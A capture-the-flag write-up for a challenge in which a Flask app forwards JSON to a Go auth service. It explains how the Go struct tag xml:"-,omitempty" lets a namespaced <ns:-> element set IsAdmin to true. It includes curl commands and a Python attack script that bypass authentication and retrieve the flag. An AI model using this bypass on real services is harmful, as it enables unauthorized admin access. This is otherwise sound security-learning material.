# Go brrr

Co-authors: @p3ngu1nw

```
Enough php for today, let's Go for some Python
```

In attachment, a Python file is provided:

```python
from flask import Flask, request, session
import requests
import secrets
import os


app = Flask(__name__)

app.secret_key = secrets.token_hex(32)

auth_service_url = 'http://localhost:8082/user'

@app.route('/user', methods=['POST'])
def user_handler():
    data = request.get_json() or None
    if data is None or not "username" in data or not "password" in data:
        return "Invalid data format (not a valid JSON schema)", 400
    check = requests.post(auth_service_url, json=data).text
    if check == '"Authorized"':
        session['is_admin'] = True
        return "Authorized"
    else:
        return "Not Authorized", 403
    

@app.route('/admin', methods=['GET'])
def admin_panel():
    if session.get('is_admin'):
        flag = os.getenv('DYN_FLAG', 'BHFlagY{dummy_flag_for_testing}')
        return "Welcome to the admin panel! Here is the flag: " + flag
    else:
        return "Access denied", 403

app.run(host='0.0.0.0', port=8081)
```

It sends JSON to another service and waits for `Authorized`. The other service is implemented in Go:

```go
package main

import (
	"encoding/json"
	"encoding/xml"
	"fmt"
	"io/ioutil"
	"net/http"
)

type User struct {
	Username string `json:"username" xml:"username"`
	Password string `json:"password" xml:"password"`
	IsAdmin  bool   `json:"-"  xml:"-,omitempty"`
}

func userHandler(w http.ResponseWriter, r *http.Request) {
	var user User

	body, err := ioutil.ReadAll(r.Body)
	if err != nil {
		http.Error(w, "Unable to read body", http.StatusBadRequest)
		return
	}

	
	if err := xml.Unmarshal(body, &user); err != nil {
		fmt.Println("XML unmarshal failed, trying JSON:", err)
		if err := json.Unmarshal(body, &user); err != nil {
			http.Error(w, "Invalid data format (not XML or JSON)", http.StatusBadRequest)
			return
		}
	}

	w.Header().Set("Content-Type", "application/json")
	if user.IsAdmin {
		w.Write([]byte(`"Authorized"`))
	} else {
		w.Write([]byte(`"Not Authorized"`))
	}
}

func main() {
	http.HandleFunc("/user", userHandler)
	fmt.Println("Server running on 0.0.0.0:8082")
	http.ListenAndServe("0.0.0.0:8082", nil)
}
```

The problem is:

```go
	Username string `json:"username" xml:"username"`
	Password string `json:"password" xml:"password"`
	IsAdmin  bool   `json:"-"  xml:"-,omitempty"`
```

`xml:"-,omitempty"` does not mean the field is ignored. It is `"-"` plus `omitempty`, so it matches a tag named `-`. However, `<->` is an invalid XML tag, we need to add namespace prefix:

```shell
$ curl -X POST http://127.0.0.1:8082/user --data "<User><username>test</username><password>test</password><ns:->true</ns:-></User>"
"Authorized"
```

The next problem is that, we are passing JSON to the python service, but we need to send XML to the golang service. This part is solved by @p3ngu1nw by using quotes:

```shell
$ curl -X POST http://172.17.0.3:8081/user -H "Content-Type: application/json" --data '"<User><username>test</username><password>test</password><ns:->true</ns:-></User>"'
Authorized
```

So the last thing is to login in the online instance and grab the flag. The attack script is written by @p3ngu1nw:

```python
import requests

url = "http://udnuz3uxblc-0.playat.flagyard.com/user"

# 构造 XML payload，让 Go 服务解析后 IsAdmin=true
xml_payload = """
"<User><username>test</username><password>test</password><ns:->true</ns:-></User>"
"""

headers = {
    "Content-Type": "application/json"
}

session = requests.Session()
resp = session.post(url, data=xml_payload, headers=headers)

print("Response from /user:", resp.text)

# 如果成功，可以访问 /admin 拿 flag
resp2 = session.get("http://udnuz3uxblc-0.playat.flagyard.com/admin")
print("Response from /admin:", resp2.text)
```

Output:

```
Response from /user: Authorized
Response from /admin: Welcome to the admin panel! Here is the flag: BHFlagY{4000704b8dec451f3f648384230d55b4}
```
